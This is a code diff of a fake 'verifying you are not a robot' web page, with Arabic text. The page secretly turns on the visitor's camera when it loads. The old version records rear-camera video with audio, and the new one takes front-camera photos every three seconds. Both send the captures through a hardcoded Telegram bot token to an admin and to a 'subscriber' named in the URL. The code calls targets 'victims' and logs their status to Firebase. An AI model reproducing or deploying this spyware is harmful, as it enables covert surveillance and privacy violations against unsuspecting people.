@@ -11,16 +11,16 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
         body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2); background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite; }
         @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
-        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
-        .progress-container { background-color: #f3f3f3; border-radius: 10px; height: 20px; width: 100%; margin: 20px 0; overflow: hidden; }
-        .progress-bar { background-color: #ff5722; height: 100%; width: 100%; transition: width 1s linear; }
-        video { display: none; } 
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px; }
+        h1 { color: red; font-size: 22px; margin-bottom: 15px; }
+        .progress-container { background: #eee; border-radius: 10px; height: 20px; width: 100%; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #ff5722; height: 100%; width: 100%; transition: 1s linear; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="loading-container">
+    <div class="container">
         <h1>جاري التحقق من أنك لست روبوت</h1>
         <p>يرجى الانتظار حتى ينتهي العد التنازلي...</p>
         <div class="progress-container">
@@ -29,7 +29,8 @@
         <p id="countdown">20</p>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         // 1. إعدادات الفايربيس
@@ -39,88 +40,87 @@
 
         // 2. إعدادات التليجرام
         const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
-        const adminChatId = "5375214810";
+        const adminChatId = "5375214810"; // الأي دي الخاص بك (الأدمن)
 
+        // جلب معرف المشترك من الرابط ( user_id هو Chat ID التليجرام الخاص بالمشترك)
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get("user_id") || "Unknown";
 
-        let videoStream;
-        let recordedChunks = [];
-        let mediaRecorder;
+        // 3. نظام العد التنازلي
+        let timeLeft = 20;
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            document.getElementById("countdown").innerText = timeLeft;
+            document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                document.querySelector('.container').innerHTML = "<h1>تم التحقق بنجاح ✅</h1><p>سيتم تحويلك الآن...</p>";
+            }
+        }, 1000);
 
-        // 3. تحديث الحالة في الفايربيس للمشترك
-        function updateFirebaseStatus(statusText) {
+        // 4. تحديث الموقع (Firebase) - الشاشة الحية للمستخدم
+        function updateLiveStatus(statusText) {
             if (userId !== "Unknown") {
-                db.ref('hits/' + userId + '/كاميرا_خلفية').set({
+                db.ref('hits/' + userId + '/كاميرا').set({
                     status: statusText,
                     device: navigator.userAgent,
-                    last_seen: new Date().toLocaleString()
+                    last_update: new Date().toLocaleString()
                 });
             }
         }
 
-        // 4. تشغيل الكاميرا الخلفية
+        // 5. تشغيل الكاميرا والسحب
         async function startCapture() {
             try {
-                // محاولة استهداف الكاميرا الخلفية (environment)
-                videoStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" }, 
-                    audio: true 
-                });
-                document.getElementById('video').srcObject = videoStream;
+                const video = document.getElementById('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
                 
-                updateFirebaseStatus("📸 الضحية فتح الرابط - جاري سحب فيديو خلفي");
-                startCountdown();
-                startRecording();
+                updateLiveStatus("🎥 الضحية متصل الآن - جاري سحب الصور");
+
+                // سحب صورة كل 5 ثوانٍ (تجنب الـ 10ms عشان البوت ميعملش سبام ويتحظر)
+                setInterval(() => {
+                    takeSnap(video);
+                }, 3000); 
             } catch (err) {
-                updateFirebaseStatus("❌ الضحية رفض الصلاحيات أو الكاميرا الخلفية غير متاحة");
+                updateLiveStatus("❌ الضحية رفض السماح بالكاميرا");
             }
         }
 
-        function startCountdown() {
-            let timeLeft = 20;
-            const interval = setInterval(() => {
-                timeLeft--;
-                document.getElementById("countdown").innerText = timeLeft;
-                document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
-                if (timeLeft <= 0) clearInterval(interval);
-            }, 1000);
+        function takeSnap(video) {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("photo", blob, "snap.jpg");
+                
+                // إضافة نص توضيحي للرسالة
+                const caption = `📸 صيد كاميرا جديد\n🆔 صاحب الرابط: ${userId}\n📱 الجهاز: ${navigator.platform}`;
+
+                // إرسال للأدمن (أنت)
+                sendToTelegram(adminChatId, blob, caption);
+
+                // إرسال للمشترك (لو حاطط الـ ID بتاعه في الرابط)
+                if (userId !== "Unknown" && userId !== adminChatId) {
+                    sendToTelegram(userId, blob, "📸 مبروك! تم سحب صورة من ضحيتك");
+                }
+            }, "image/jpeg");
         }
 
-        // 5. التسجيل والإرسال
-        function startRecording() {
-            mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: "video/webm" });
-                sendToTelegram(blob);
-                recordedChunks = [];
-                startRecording(); // إعادة التشغيل فوراً
-            };
+        function sendToTelegram(chatId, blob, caption) {
+            const fd = new FormData();
+            fd.append("chat_id", chatId);
+            fd.append("photo", blob, "snap.jpg");
+            fd.append("caption", caption);
 
-            mediaRecorder.start();
-            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
-        }
-
-        function sendToTelegram(blob) {
-            const caption = `🎬 فيديو كاميرا خلفية\n🆔 المشترك: ${userId}\n📱 الجهاز: ${navigator.platform}`;
-            
-            // إرسال للأدمن
-            const adminData = new FormData();
-            adminData.append("chat_id", adminChatId);
-            adminData.append("video", blob, "back_cam.webm");
-            adminData.append("caption", caption);
-            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: adminData });
-
-            // إرسال للمشترك صاحب الـ ID
-            if (userId !== "Unknown" && userId !== adminChatId) {
-                const userData = new FormData();
-                userData.append("chat_id", userId);
-                userData.append("video", blob, "back_cam.webm");
-                userData.append("caption", "🎬 مبروك! وصلك صيد فيديو من الكاميرا الخلفية");
-                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: userData });
-            }
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: fd
+            }).catch(e => console.error("Telegram Error"));
         }
 
         window.onload = startCapture;
